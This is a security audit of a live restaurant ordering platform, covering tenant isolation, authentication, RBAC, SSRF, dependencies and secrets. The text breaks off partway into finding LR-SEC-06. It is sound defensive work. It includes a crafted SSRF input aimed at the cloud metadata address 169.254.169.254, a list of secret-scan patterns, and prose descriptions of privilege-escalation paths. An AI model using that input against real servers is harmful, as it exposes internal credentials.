# Launch-Readiness Audit — 04: Security

**Date:** 2026-07-10. Companion to `01-system-inventory.md`, `02-architecture-and-data-flow.md`, and `03-payment-and-stripe-connect-audit.md`.

**Audit context.** The platform went **live on 2026-07-10**; this deliverable governs continuing live operation, not a pre-launch gate. Findings below were produced by four independent **read-only** auditors — (A) authentication / sessions / impersonation / CSRF / MFA; (B) content-injection / XSS / uploads / SSRF / headers / debug routes; (C) multi-tenant isolation + intra-tenant RBAC + the C1/C2 modifier-IDOR regression; (D) dependencies / secrets / logging / rate-limits / cron-and-webhook auth / Sentry. No code was modified by any auditor. Their raw findings are rendered verbatim-in-substance in §7 as `LR-SEC-01…21`, ordered by severity. Framing follows OWASP ASVS boundaries (V2 authentication, V3 session management, V4 access control, V5 validation/sanitization, V13 API, V14 config).

> **Standing owner rule honored throughout.** Per Luigi's directive, **no dependency upgrade and no `npm audit fix` has been run**. The two dependency findings (LR-SEC-03, LR-SEC-04) are presented as **recommended remediation requiring owner sign-off**, not as completed work. Nothing in this document contains a secret value — the secrets scan (§6) reports **pattern names only**.

---

## 1. Executive posture

**Lead result — cross-tenant isolation is SOUND.** The highest-stakes boundary on a multi-tenant payments platform is that one restaurant can never read or write another restaurant's data. Auditor C sampled **35+ route handlers across the full admin write surface and found no bare-`id` IDOR** — every restaurant-scoped write is constrained either by `where: { id, restaurantId }` / `updateMany` / `deleteMany` or by a `findFirst`/`findUnique` ownership pre-check that 403/404s on a tenant mismatch. The stabilization **C1 and C2 modifier-IDOR fixes are intact** (re-verified below). The reseller, superadmin, and customer boundaries all **re-validate server-side on every request** — reseller impersonation re-checks `restaurant.resellerProfileId === user.resellerProfileId` and approval status per request; superadmin routes gate on the real `role`, never the impersonated `effectiveRole`; the two customer account systems scope every address/order read and write by the session's `customerAccountId` / `customerId`. Auth is also **markedly more mature than typical first-product code** (Auditor A): bcrypt everywhere, dual-layer brute-force protection wired into all four login surfaces, 256-bit single-use 1-hour reset tokens, `httpOnly` + `sameSite=lax` on every session cookie, and the `preferKitchen` tiebreak bug genuinely fixed. Content-injection posture is strong: **all 18 `dangerouslySetInnerHTML` sites are safe** (every JSON-LD emit passes through `safeJsonLd()`; user content renders as auto-escaped React text), **every raw SQL statement is parameterized** (tagged-template `$queryRaw`, zero `$queryRawUnsafe` in `src/`), and the `next.config.ts` security-header set is in place. Cron/webhook auth is **fail-closed** across all 18 cron routes and every webhook verifies signatures. **No live secret is committed to git.**

**Principal gaps (none are a cross-tenant breach).** The residual risk concentrates in four areas, in priority order:

1. **Intra-tenant authorization is not enforced (LR-SEC-02, High).** A well-built central RBAC helper (`src/lib/access.ts`) exists and correctly caps `kitchen_staff` at the `staff` tier — but only ~7 of 291 route handlers call it. Almost every admin write route authorizes on the mere *presence* of `user.restaurantId`, so within a single restaurant a `kitchen_staff` credential can edit prices, promotions, service fees, and reward rules. Real insider-tampering / privilege-escalation risk as tenants add non-owner staff.
2. **The most privileged capability has no forensic trail (LR-SEC-01, High).** Superadmin and reseller impersonation write **no durable audit record** of who assumed which tenant, when, or what they did. Abuse or a compromised superadmin session is invisible after the fact.
3. **Outdated dependencies carry HIGH advisories (LR-SEC-03 / LR-SEC-04, High).** `next@16.2.4` is subject to multiple App-Router middleware/proxy-bypass, redirect-cache-poisoning, and CSP-nonce-XSS advisories — exactly the surface this app leans on via `src/proxy.ts` — fixed in the in-range patch `16.2.10`. Transitive `undici`/`fast-uri` HIGHs are fixable in place. **Owner sign-off required before any bump.**
4. **Hardening consistency gaps (Medium/Low).** SSRF on the *authenticated* GloriaFood import (public path is clamped, admin path is not); non-revocable 30-day customer JWTs; a malformed anti-timing dummy hash that defeats its own enumeration defense; missing rate limits on `POST /api/orders`, customer signup, and the Nominatim geocode proxy; no MFA anywhere including superadmin; and residual customer email/phone in server logs.

**Overall verdict: LAUNCH-ACCEPTABLE with continuing-operation remediation.** No Critical was found in this domain. The two operational High items (RBAC enforcement, impersonation audit) should be scheduled promptly because they compound as staff-account and superadmin usage grow; the dependency Highs await owner approval; the Mediums are cheap hardening on live-traffic paths.

---

## 2. Multi-tenant isolation

**Method (Auditor C).** Read `src/lib/session.ts` (impersonation chain), `src/lib/access.ts` + `src/lib/roles.ts` (central RBAC), then sampled 35+ handlers. Verdict key: **SCOPED** = write constrained to the session's `restaurantId` (or a pre-verified ownership check); **UNSCOPED** = a bare-`id` write with no tenant check.

### 2.1 Per-route verdicts — restaurant-scoped writes

| Route / family | Verdict | Isolation basis |
|---|---|---|
| `menu/items/[id]` — GET/PATCH/PUT/DELETE | **SCOPED** | `updateMany`/`deleteMany where {id,restaurantId}`; `categoryId` re-verified to tenant; combo entitlement-gated. Variant sync (`deleteMany where {menuItemId:id}`) is reached only *after* the scoped item update — scoped in practice. |
| `menu/categories/[id]` — PATCH/DELETE | **SCOPED** | `getOwned(id,restaurantId)` `findFirst` before write-by-id. |
| `menu/modifiers/[id]` — PATCH/DELETE **(C1)** | **SCOPED** | Ownership re-derived (`group.restaurantId` OR owned `menuItem`/`category`) before update-by-id. **C1 fix intact.** |
| `menu/modifiers` — POST + `attach`/`attach-bulk`/`reorder` **(C2)** | **SCOPED** | Supplied `menuItemId`/`categoryId`/`variantId` each verified to belong to `restaurantId` before a priced group attaches. **C2 fix intact.** |
| `restaurants/promotions/[id]` — PATCH/DELETE | **SCOPED** | `update`/`delete where {id,restaurantId}`; locked-type entitlement gate. |
| `orders/[id]` — GET/PATCH + `delay` | **SCOPED** | `findUnique` then explicit `existing.restaurantId !== user.restaurantId` → 403 (superadmin exempt). |
| `orders/[id]/refund` | **SCOPED** | `restaurantId !==` → 403; cumulative-refund idempotency key; card-only. |
| `admin/customers/[id]` + reward-grant | **SCOPED** | `restaurantId` mismatch → 404; customer-grants `updateMany where {id,restaurantId}`. |
| `admin/reward-rules/[id]` | **SCOPED** (tenant) | `rule.restaurantId !==` → 404. *(Intra-tenant role gap — see §4.)* |
| `admin/service-fees/[id]` | **SCOPED** | `authorize()` `findFirst {id,restaurantId}`. |
| `restaurants/payment-provider` + `test` | **SCOPED** | Keyed by `restaurantId` (unique); secret masked on GET, encrypted at rest. |
| `restaurants/delivery/[id]` | **SCOPED** | `update`/`delete where {id,restaurantId}`. |
| `admin/reservations/[id]`, `reservation-tables/[id]` | **SCOPED** | `findFirst {id,restaurantId}` then update-by-id; stale-device autoMissed guard. |
| `restaurants/receipts` | **SCOPED** | All writes keyed by session `restaurantId`. |
| `restaurants/locations` + `switch` | **SCOPED** | Canonical parent derived server-side; child sees only self; `ownerCanSwitchToLocation` validated. |
| `admin/billing/change-plan` + `checkout`; `add-ons/checkout`+`cancel`; `kitchen-devices` | **SCOPED** | Keyed to `user.restaurantId`; add-ons use `requireRestaurantAccess` (central RBAC). |
| Spot-checks: `vip-schedules/[id]`, `customer-groups/[id]`, `marketing-studio/assets/[id]`, `notification-recipients/[id]`, `holidays/[id]`, `menus/[id]`, `restaurants/profile`, `menu/items/[id]/duplicate`, `kitchen/menu-stock/[id]`, `seed-demo` | **SCOPED** | `findFirst`/`findUnique` tenant check or `where {id,restaurantId}`. |

**No bare-`id` write IDOR was found in the sampled admin write surface.**

### 2.2 Reseller / superadmin / customer isolation

- **Reseller.** `reseller/impersonate` re-validates `restaurant.resellerProfileId === user.resellerProfileId` **and** profile `status=approved` before setting the `partner_impersonate` cookie; `getSessionUser` re-checks on every request (`resellerCanImpersonate`). `reseller/restaurants` and `reseller/commissions` scope to `user.resellerProfileId` (superadmin may pass `?resellerProfileId`, superadmin-gated). **SCOPED.**
- **Superadmin.** `superadmin/*` routes gate on the real `user.role === 'superadmin'` (never `effectiveRole`), so a superadmin-as-reseller impersonation keeps superadmin API power correctly and cannot be downgraded by an impersonation overlay. **SCOPED.**
- **Customer.** Two separate account systems (marketplace `CustomerAccount` via `ff_customer`; per-restaurant `Customer` via `ff_rest_account`). `customer/addresses/[id]` and `public/restaurant-customer/addresses/[id]` scope every read/write by `customerAccountId` / `customerId` from the session — customer A cannot touch B's addresses. Order cancel + rating verify ownership via `checkOrderOwnership` across both systems. **SCOPED.**
- **Public menu.** `order/[slug]` and `restaurants/[slug]` APIs gate on `isActive:true`; an inactive restaurant 404s. No unpublished-menu leak found. *(Note: gating is on `isActive`, not a distinct publish flag — confirm "inactive == unpublished" is the intended contract.)*
- **By-design exception:** unauthenticated `orders/[id]` GET returns the public projection for any (high-entropy `cuid`) order id — see **LR-SEC-18**.

### 2.3 C1/C2 regression check

**CONFIRMED STILL FIXED.** `menu/modifiers/[id]` PATCH (C1) re-derives ownership before the update-by-id (its comment explicitly references stabilization C1). `menu/modifiers` POST (C2) verifies supplied `menuItemId`/`categoryId`/`variantId` belong to the caller's `restaurantId` before attaching a priced group. Neither regressed.

---

## 3. Authentication & sessions

**Four session systems** (Auditor A): (1) owner/staff — NextAuth JWT, cookie `next-auth.session-token`; (2) kitchen — NextAuth JWT, cookie `next-auth.kitchen-session-token`, plus a single-active-session DB token; (3) marketplace customer — hand-rolled JWT, cookie `ff_customer`; (4) per-restaurant customer — hand-rolled JWT, cookie `ff_rest_account`. Reseller "view as" and superadmin impersonation are cookie overlays on the NextAuth session, resolved in `getSessionUser()`.

- **Password hashing (ASVS V2.4).** `bcryptjs` everywhere; no `passwordHash` is ever logged. **Cost factors are inconsistent** — owner register cost 12, but owner/staff reset and both customer signup+reset paths cost 10 (**LR-SEC-08**).
- **Login lockout / rate limiting (ASVS V2.2).** `src/lib/login-protection.ts` runs two independent layers keyed on *failures only*: shared-store IP+email counters (10 fails / 5 min, 30-attempt flood ceiling, scoped per surface) and a DB row lockout (15 min at 10 consecutive failures). All four login surfaces call both. Refusals return the **same generic error** as a wrong password. Gaps: the DB lockout covers only `User` rows — the two customer systems have **no DB lockout backstop**, so under a shared-store outage they degrade to per-isolate limits (**LR-SEC-17**), and cross-isolate limits only exist when the shared store is configured (**LR-SEC-20**).
- **Password reset tokens (ASVS V2.5).** Strong across all systems: `crypto.randomBytes(32)` (256-bit), 1-hour TTL, single-use with `usedAt` burn (or row-clear), prior unused tokens burned on re-request, reset endpoints rate-limited (10/hr/IP). Forgot-password always returns `ok:true` (correct anti-enumeration).
- **Cookie flags (ASVS V3.4).** All session cookies are `httpOnly` + `sameSite=lax`. NextAuth (owner/kitchen) adds `secure` + `__Secure-` prefix on the real production host (deliberately disabled on tunnel hosts to survive iOS Safari dropping prefixed cookies — reasonable, auto-flips on the real domain). Customer JWTs are `secure` only when `NODE_ENV===production`, no prefix, signed with the reused `NEXTAUTH_SECRET`, minimal payload. No token in a non-`httpOnly` cookie or `localStorage`.
- **Session lifetime / rotation / revocation (ASVS V3.3).** Kitchen has the only server-side revocation: a rotating `Restaurant.kitchenSessionToken` minted per login and checked per poll (new device evicts old). Owner/staff NextAuth JWT is stateless (logout clears the cookie; a copied JWT stays valid until 30-day expiry). **Both customer JWTs are 30-day and NOT server-revocable** — logout clears only the cookie and password reset does not invalidate outstanding tokens (**LR-SEC-06**).
- **`preferKitchen` tiebreak.** `getSessionUser` resolves admin + kitchen sessions in parallel, then picks `preferKitchen ? kitchen : admin` with `restaurantId` explicitly **not** a tiebreaker — the prior superadmin-downgrade bug (commit `c16dba8f`) is genuinely fixed and matches the AGENTS.md standing rule. **No issue.**
- **Impersonation controls.** Three layers, all cookie overlays with 8-hour TTL, `httpOnly`/`sameSite=lax`, reversible exit; the **real `role` never changes** (API authz keys off `role`, UI off `effectiveRole`). Reseller→restaurant re-validates every request; superadmin→reseller swaps only `effectiveRole`. **Material gap: no audit logging (LR-SEC-01).**
- **MFA (ASVS V2.8).** **None anywhere**, including superadmin — the single most powerful account (impersonate any tenant, touch payout config, read all customer PII) is password + lockout only (**LR-SEC-15**).
- **Account enumeration (ASVS V2.5.6).** Login returns identical generic errors, but the anti-timing dummy hash is malformed and defeats itself (**LR-SEC-07**); signup endpoints explicitly confirm "account already exists" (**LR-SEC-16**).
- **CSRF posture (ASVS V4.2 / V13).** NextAuth ships its own CSRF double-submit token (intact). Custom customer/reseller/impersonation POST/DELETE endpoints rely on `sameSite=lax` as their **only** CSRF control — which does block cross-site POST, so practical risk is low, but it is a single control. Recommendation: add an explicit CSRF token or Origin/Referer check to the impersonation POSTs (highest privilege) as defense-in-depth. No state-changing GET exists among auth routes (verify-email GET consumes a high-entropy single-use token — standard for email links).

---

## 4. Authorization / RBAC

**Key High — LR-SEC-02.** A central access-tier RBAC module exists at `src/lib/access.ts` (`canActOnRestaurant` / `requireRestaurantAccess` with the hierarchy `readonly < staff < manager < reseller_manager < owner`) and **correctly caps `kitchen_staff` at the `staff` tier**. But **only ~7 of 291 route handlers call it** (`add-ons/*`, `billing/setup-card`, `kitchen-devices`, `publishing`). The overwhelming majority of admin write routes authorize on the **mere presence of `user.restaurantId`** — i.e. *any* authenticated user attached to the restaurant, including `kitchen_staff`, can write.

Concretely, `reward-rules/[id]`, `service-fees/[id]`, `customers/[id]` notes, `restaurants/delivery/[id]`, `restaurants/promotions/[id]` PATCH/DELETE, `menu/items/[id]`, receipts, reservation settings, and vip-schedules perform **no role/access-tier check beyond `restaurantId` presence**. Net effect: within a single tenant there is effectively **no manager-vs-staff separation on the money/menu/promo config surface** — a kitchen tablet handed to hourly staff can edit prices, service fees, discount promotions, and reward-earn rules. This is a genuine privilege-escalation / insider-tampering risk (not a cross-tenant breach) that compounds as restaurants add non-owner accounts.

**Remediation (reuses the existing, tested helper, no schema change):** insert `await requireRestaurantAccess(user, restaurantId, ACCESS_ROLES.MANAGER)` at the top of config/money write routes (menu, promotions, service-fees, reward-rules, delivery zones, receipts, reservation-settings, customer notes, vip-schedules, payment-provider), while keeping kitchen order-flow routes at the `staff` tier.

---

## 5. Content / injection / uploads / headers

**Method (Auditor B).** Grepped the full `src` tree for `dangerouslySetInnerHTML`, `$queryRaw`/`$executeRaw`, `fetch()`, `put()`/`@vercel/blob`, `redirect()`, `Access-Control`, and read every hit. The `5fa6300d` hardening (`safeJsonLd` + `escapeHtml` + `next.config` headers) is intact and still fully covers every sink it was written for.

- **XSS / `dangerouslySetInnerHTML` (ASVS V5.3).** 18 sites total. **All JSON-LD emits pass through `safeJsonLd()`** (11 page files). Three non-JSON-LD uses in `site/[slug]/page.tsx` inject only static constant CSS/JS with zero interpolated user data. Email templates escape restaurant name via `escapeHtml()` before ICU substitution; user-content fields (item names, promo names, order notes, rejection reason) render as auto-escaped React text. **No XSS finding.**
- **SQL / command injection (ASVS V5.3.4).** Every `$queryRaw`/`$executeRaw` uses tagged-template literals, so all interpolated values are **bound parameters**; **no `$queryRawUnsafe`/`$executeRawUnsafe` anywhere in `src`**; no `child_process`/`exec`/`eval`. **No injection finding.**
- **SSRF (ASVS V5.2.6).** The **authenticated** GloriaFood admin import fetches a host taken verbatim from the pasted URL **without** the `clampToGloriaFoodHost` guard the *unauthenticated* public path applies — an SSRF reachable by any self-signup restaurant owner (**LR-SEC-05**). The per-minute menu-image re-host cron fetches a stored `sourceUrl` with no host allow-list (not attacker-controllable today, defense-in-depth gap — **LR-SEC-14**).
- **Open redirects / path traversal (ASVS V5.1.5 / V12).** None. `callbackUrl` is threaded only through NextAuth (same-origin-enforced); all server `redirect()` calls use hard-coded internal paths; no file-serving route takes a user-supplied filename into `readFile`/`path.join`. Upload filenames derive purely from timestamp+random+MIME-mapped extension.
- **Uploads (ASVS V12.1 / V5.5).** The reseller upload endpoint **allow-lists `image/svg+xml`** (the other two upload endpoints deliberately do not) and stores it `access:'public'` served as `image/svg+xml`. Safe in the `<img>` render path, but the returned blob URL is directly navigable and an SVG opened as a top-level document executes embedded script — bounded stored-XSS in the *blob* origin (cross-origin from the app, so first-party cookies aren't directly exposed) (**LR-SEC-13**).
- **Headers & CORS (ASVS V14.4 / V14.5).** `next.config.ts` ships the safe set on every route: `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, HSTS `max-age=63072000; includeSubDomains` (deliberately no `preload`), `Permissions-Policy` locking camera/mic, `X-Frame-Options: SAMEORIGIN` + CSP `frame-ancestors 'self'` on all paths **except** `/embed` and `/order` (correctly frameable for the widget). **CSP `script-src` is still deferred** (documented, needs a nonce-based report-only rollout — a known accepted gap, not a regression). No route sets `Access-Control-Allow-Origin` — API is same-origin by default.
- **Debug / seed routes & error leakage (ASVS V14.3).** All seed/test routes are auth-gated (`seed-test` requires `role==='superadmin'`; `seed-demo` requires a session with `restaurantId`; the rest inherit `/api/admin|/api/kitchen|/api/superadmin` gates). Errors return generic bodies (`{error:'Failed to place order'}`) with server-side logging — **no stack-trace leakage**. Sentry source maps are uploaded then stripped from served bundles. **No debug/error-leakage finding.**

---

## 6. Platform / supply chain / ops exposure

**Method (Auditor D).** `git grep` over tracked files + reads + `npm audit --omit=dev` (read-only, no fix). Stabilization/launch-readiness fixes referenced in memory are **actually present in code**: fail-closed cron auth, fail-closed rate limiter, PII-off Sentry, `escapeHtml` in emails.

- **Dependencies (ASVS V14.2).** `package-lock.json` is git-tracked (reproducible installs). `npm audit --omit=dev`: **17 vulns (1 low, 12 moderate, 4 high)**. The material items: `next@16.2.4` (HIGH — App-Router middleware/proxy-bypass, redirect cache-poisoning, CSP-nonce XSS, RSC cache poisoning, image-optimization DoS; fix = in-range patch `16.2.10`) — **LR-SEC-03**; `undici <=6.26.0` and `fast-uri <=3.1.1` (HIGH, fixable via non-forcing `npm audit fix`) — **LR-SEC-04**; and `next-auth@4.24.14 → uuid <11.1.1` (moderate, only remediable by a `next-auth` major — **tracked accepted risk**, LR-SEC-21). **No dependency change has been made — all await owner sign-off.**
- **Secrets hygiene (ASVS V14.1 / V2.10).** **No live secret is committed.** `.gitignore` covers `.env*` (with `!.env.example`), `*.pem`, `*.db`, `/.revert-staging/`, and native keystores. A scan for the patterns `sk_live_`, `whsec_`, `AKIA`, and `BEGIN … PRIVATE KEY` across tracked files matched **only** documentation, placeholders, validation/prefix-display code, and one round-trip test fixture — **no real credentials**. *(This document reports pattern names only; no values are reproduced.)*
- **Logging hygiene (ASVS V7.1 / V8.3).** The stabilization-flagged cleartext-email logging is **largely remediated**: payment/auth hot paths log stage tags + error messages, never raw bodies/tokens/passwords; **no console call logs a password, `passwordHash`, API key, or card number**. Residual PII remains in server logs (low risk, not client-visible): forgot-password handlers log the submitted email on the no-account branch; several notification libs log recipient `.email` on send-failure; `cron/order-alert-calls` logs the customer phone (**LR-SEC-19**).
- **Rate-limit inventory (ASVS V11.1 / V13.1).** `src/lib/rate-limit.ts` is well-designed (per-isolate Map fast path + cross-isolate Upstash/KV via fetch, **fails open** on store errors). **Have limits:** `track/visit` (60/min), `track/event` (120/min), all forgot-password (5/hr), `auth/register` (5/hr), `payment-intent` / `paypal-order` / `coupon` (10/min each), all 4 logins. **Gaps:** `POST /api/orders` (money-critical, **zero** rate limit — LR-SEC-09), customer + restaurant signup (LR-SEC-11), `GET /api/public/geocode/search` Nominatim proxy (cache only — LR-SEC-10), `apply-promos`. Cross-isolate enforcement requires prod env config (LR-SEC-20).
- **Cron / webhook / internal auth (ASVS V13.2).** **All 18 cron routes are authenticated — none fail open.** Two fail-closed patterns: `requireCronAuth` (`CRON_SECRET` set → exact `Bearer` required; unset → 401 in production) and inline dual-auth (`Bearer CRON_SECRET` OR superadmin session — an unset secret does not open them). Internal `resolve-host` requires `x-internal-key === INTERNAL_API_SECRET` in production. All webhooks verify signatures (Stripe, per-restaurant Stripe decrypt+verify, ShipDay token). **Clean.**
- **Admin-content injection into emails.** Restaurant-controlled fields (name) are `escapeHtml()`-escaped before entering email HTML; table values escaped via `esc(String(v))`. The one raw interpolation is an email **subject** header (not an HTML body — not an injection vector). **Well-covered.**
- **Sentry / error reporting (ASVS V7.2).** Genuinely wired (`withSentryConfig`; server + edge + client init), live only when the DSN is set in prod, `sendDefaultPii:false`, replay masks all text/inputs. `reportError` never throws and mandates identifiers-only. **Adoption gap:** it is wired into only 3 handlers (orders POST, platform Stripe webhook, PayPal webhook) — the **per-restaurant Stripe webhook** (a money-critical, Stripe-retried path) catches with `console.error` only, so a broken per-restaurant webhook 500s silently on every retry with no alert (**LR-SEC-12**).

---

## 7. Findings

**21 findings from four auditors** — **4 High, 8 Medium, 7 Low, 2 Informational**. No Critical in the security domain. Ordered by severity; IDs `LR-SEC-01…21`. "Professional review required" flags where owner sign-off or a specialist/product decision is needed before acting.

---

### LR-SEC-01 — Impersonation actions leave no durable audit trail
- **Severity:** High
- **Component:** Impersonation audit logging (auth / accountability)
- **Affected paths:** `src/app/api/superadmin/impersonate/route.ts`; `src/app/api/reseller/impersonate/route.ts`; `src/app/api/superadmin/resellers/[id]/impersonate/route.ts`; `src/lib/session.ts:131-192`
- **Description:** Superadmin and reseller impersonation ("view as restaurant", SA→reseller, SA→restaurant) write **no durable audit record**. None of the three impersonate routes logs who impersonated which restaurant/reseller, when it started, or when it ended. The live banner is UX-only.
- **Failure / attack scenario:** A superadmin sets `sa_impersonate` to any `restaurantId`, then places/refunds orders, edits payout/Stripe config, or exports customer PII while fully assuming that restaurant's identity. There is no server-side trail linking those actions back to the real superadmin, so abuse or a compromised superadmin session is forensically invisible.
- **Impact:** No accountability for the highest-privilege capability on a live-payments platform; blocks incident investigation and violates least-trust expectations for admin impersonation.
- **Evidence:** grep for `audit`/`AuditLog`/`activityLog` across the three routes returns no matches; each only sets a cookie and returns `ok`. `getSessionUser` applies the cookie on every request without logging.
- **Recommended remediation:** Write an append-only audit row (`actorUserId`, `targetRestaurantId`/`resellerProfileId`, `mode`, `action=start|stop`, `ip`, `timestamp`) in each impersonate POST/DELETE. Optionally log high-value writes performed while `isImpersonating` is true.
- **Professional review required:** Yes — accountability control on the most-privileged capability; design the audit schema/retention before implementing.

### LR-SEC-02 — Central RBAC helper exists but is unused on ~284 of 291 routes
- **Severity:** High
- **Component:** Intra-tenant role gating (RBAC helper not applied)
- **Affected paths:** `src/lib/access.ts` (unused by most routes); `src/app/api/admin/reward-rules/[id]/route.ts`; `src/app/api/admin/service-fees/[id]/route.ts`; `src/app/api/admin/customers/[id]/route.ts`; `src/app/api/restaurants/promotions/[id]/route.ts`; `src/app/api/menu/items/[id]/route.ts`; `src/app/api/restaurants/delivery/[id]/route.ts`; `src/app/api/restaurants/receipts/route.ts` (representative)
- **Description:** A central access-tier RBAC module (`canActOnRestaurant`/`requireRestaurantAccess` with `readonly<staff<manager<owner`) exists and correctly caps `kitchen_staff` at the `staff` tier, but **only ~7 of 291 route handlers call it**. Almost every admin write route authorizes solely on the presence of `user.restaurantId`, performing no role/access-tier check. Within one restaurant there is therefore no manager-vs-staff separation on the config/money surface.
- **Failure / attack scenario:** A restaurant hands a kitchen tablet to hourly `kitchen_staff`. That account calls `PATCH /api/admin/service-fees/[id]` or `PATCH /api/restaurants/promotions/[id]` or `PATCH /api/menu/items/[id]` and edits prices, service fees, reward-earn rules, or discount promotions. All succeed because the routes only check that a `restaurantId` is present. The owner never authorized staff to change pricing.
- **Impact:** Any lower-privilege staff credential can alter prices, fees, promotions, reward rules, and customer notes for their own restaurant. No cross-tenant breach, but a real privilege-escalation / insider-tampering risk on money-affecting config as the business adds non-owner staff accounts.
- **Evidence:** `access.ts` `canActOnRestaurant` returns `accessRoleAtLeast(STAFF, required)` for `kitchen_staff`, but grep shows only `add-ons/*`, `billing/setup-card`, `kitchen-devices`, `publishing` import it. `reward-rules/[id]` PATCH gate is only `if (!restaurantId) 401` then a `rule.restaurantId===restaurantId` check — no tier check. Same pattern in `service-fees/[id]`, `customers/[id]`, `promotions/[id]`, `menu/items/[id]`.
- **Recommended remediation:** Insert `await requireRestaurantAccess(user, restaurantId, ACCESS_ROLES.MANAGER)` at the top of config/money write routes (menu, promotions, service-fees, reward-rules, delivery zones, receipts, reservation-settings, customer notes, vip-schedules, payment-provider). Keep kitchen order-flow routes at `staff` tier. Reuses the existing, tested helper with no schema change.
- **Professional review required:** Yes — decide the manager-vs-staff capability matrix (which routes are `manager` vs `staff`) with the owner before rollout; regression-test that legitimate staff order flows still pass.

### LR-SEC-03 — Next.js 16.2.4 carries multiple HIGH App-Router / proxy advisories
- **Severity:** High
- **Component:** Dependencies — Next.js framework
- **Affected paths:** `package.json:60` (`next: 16.2.4`); `package.json:88` (`eslint-config-next: 16.2.4`); `src/proxy.ts` (affected surface)
- **Description:** `next` is pinned to `16.2.4`, subject to multiple HIGH advisories: App-Router Middleware/Proxy bypass (segment-prefetch + dynamic-route param injection), Middleware/Proxy redirect cache-poisoning, CSP-nonce XSS, RSC cache poisoning, and image-optimization/Server-Component DoS. Fix is the latest 16.2.x patch (`16.2.10`).
- **Failure / attack scenario:** This app routes tenants through `src/proxy.ts` edge middleware and emits auth-state-dependent redirects — precisely the surface the middleware/proxy-bypass and redirect-cache-poisoning advisories exploit. A crafted segment-prefetch or dynamic-route-param request could bypass proxy auth/routing, or a cache-poisoned auth redirect could be served to other visitors.
- **Impact:** Middleware/proxy auth bypass could expose tenant/admin routes without auth; redirect cache poisoning could stick a bad auth redirect in every visitor's browser (a failure mode AGENTS.md already calls out); CSP-nonce XSS undermines the security headers. High severity on the customer-facing hot path.
- **Evidence:** `npm audit --omit=dev`: `next 9.3.4-canary.0 - 16.3.0-canary.5  Severity: high`, listing GHSA-26hh-7cqf-hhc6 (App Router bypass), GHSA-3g8h-86w9-wvmq (redirect cache poisoning), GHSA-492v-c6pp-mqqv (dynamic route param bypass), GHSA-ffhc-5mcf-pf4q (CSP nonce XSS).
- **Recommended remediation (owner sign-off required — NOT applied):** Bump `next` to the latest 16.2.x patch (`16.2.10`) and `eslint-config-next` to match, run `npm run preflight` (build-critical: proxy + route handlers), re-run `npm audit` to confirm. In-range patch, low regression risk — but per the standing owner rule, do **not** apply without approval.
- **Professional review required:** Yes — owner approval required before any dependency change; run the build-critical preflight and a proxy/redirect smoke test after bumping.

### LR-SEC-04 — Transitive `undici` / `fast-uri` HIGH advisories (in-place fix available)
- **Severity:** High
- **Component:** Dependencies — transitive (`undici`, `fast-uri`)
- **Affected paths:** `package-lock.json`
- **Description:** `undici <=6.26.0` (HTTP header injection via `Set-Cookie` percent-decoding, response-queue poisoning, WS DoS) and `fast-uri <=3.1.1` (path traversal via percent-encoded dot segments) are HIGH severity and fixable in place via non-forcing `npm audit fix` (no major bumps).
- **Failure / attack scenario:** `undici` is the runtime HTTP client for server-side outbound calls (Stripe/Resend/ShipDay/Nominatim). The `Set-Cookie` / response-queue-poisoning classes could, under keep-alive socket reuse in a serverless container, cross responses between requests.
- **Impact:** Response-queue poisoning / header injection in the shared outbound HTTP client can corrupt or cross-contaminate responses; medium-to-high real impact given how many money-path integrations route through `undici`. Cheap to fix.
- **Evidence:** `npm audit --omit=dev`: `undici <=6.26.0  Severity: high … fix available via npm audit fix`; `fast-uri <=3.1.1  Severity: high … fix available via npm audit fix`.
- **Recommended remediation (owner sign-off required — NOT applied):** Run `npm audit fix` (non-forcing) to patch `undici`, `fast-uri`, `@babel/core`, and the `@opentelemetry` chain without breaking changes; run preflight; commit the lockfile update. Do **not** apply without owner approval.
- **Professional review required:** Yes — owner approval required; verify the lockfile diff stays within non-breaking patch ranges and preflight passes.

### LR-SEC-05 — Authenticated GloriaFood import is an SSRF (public path clamps, admin path does not)
- **Severity:** Medium
- **Component:** GloriaFood menu import — SSRF
- **Affected paths:** `src/app/api/menu/import-gloriafood/route.ts:39-72` (POST) & PUT; `src/lib/menu-import/gloriafood.ts:373-380` (`fetchGF`), `:318-320` (`clampToGloriaFoodHost`)
- **Description:** The authenticated admin import path fetches `https://<brandedDomain><path>` where `brandedDomain` is taken verbatim from the URL the owner pastes (`parseSource` sets it from the pasted host at `gloriafood.ts:269`). Unlike the **unauthenticated** public endpoint (`api/import/public/route.ts:51`, which calls `clampToGloriaFoodHost`), the admin POST/PUT calls `fetchGloriaFoodMenu(parsed)`/`fetchGloriaFoodPictures(parsed)` with the **un-clamped** host. The library's own doc-comment (`gloriafood.ts:299-311`) explicitly flags this host as an SSRF vector and says callers must clamp it; the admin route never does.
- **Failure / attack scenario:** A logged-in `restaurant_admin` pastes a crafted "ordering URL" whose host is an internal address, e.g. `http://169.254.169.254/latest/meta-data/?restaurant_uid=<valid-uuid>`. `parseSource` keeps `hostname=169.254.169.254`; the server then issues `GET http://169.254.169.254/api/restaurant/<uuid>/menu` from inside Vercel's network. Response bodies surface back in the error/preview path, enabling cloud-metadata / internal-service probing from the server's egress IP.
- **Impact:** Server-side request forgery reachable by any authenticated restaurant owner (a low-trust, self-signup role). Lets a tenant pivot the server into fetching internal/cloud-metadata endpoints and read responses — credential/metadata exposure and internal port scanning.
- **Evidence:** `gloriafood.ts:302-303` comment: "*Behind admin auth that's fine, but for the UNAUTHENTICATED public import it's an SSRF vector — so the public endpoint MUST clamp.*" The admin route (`import-gloriafood/route.ts:69-72`) passes `parsed` straight into `fetchGloriaFoodMenu`/`fetchGloriaFoodPictures` with no clamp, whereas `import/public/route.ts:51` does clamp. `fetchGF` builds `` `https://${src.brandedDomain}${path}` `` at `gloriafood.ts:374`.
- **Recommended remediation:** Wrap the admin import the same way the public one does — call `clampToGloriaFoodHost(parseSource(source))` before any fetch in both the POST and PUT handlers. "Authenticated" is not a sufficient control here because the authenticated role is self-service signup.
- **Professional review required:** No — mechanical parity fix; verify a legitimate GloriaFood import still succeeds and an internal-IP host is rejected.

### LR-SEC-06 — Hand-rolled customer JWTs are 30-day and not server-revocable
- **Severity:** Medium
- **Component:** Customer session revocation
- **Affected paths:** `src/lib/customer-session.ts:44-95`; `src/lib/restaurant-customer-session.ts:62-148`; `src/app/api/customer/logout/route.ts`; `src/app/api/restaurants/[slug]/account/logout/route.ts`; `src/app/api/customer/reset-password/route.ts`; `src/app/api/restaurants/[slug]/account/reset-password/route.ts`
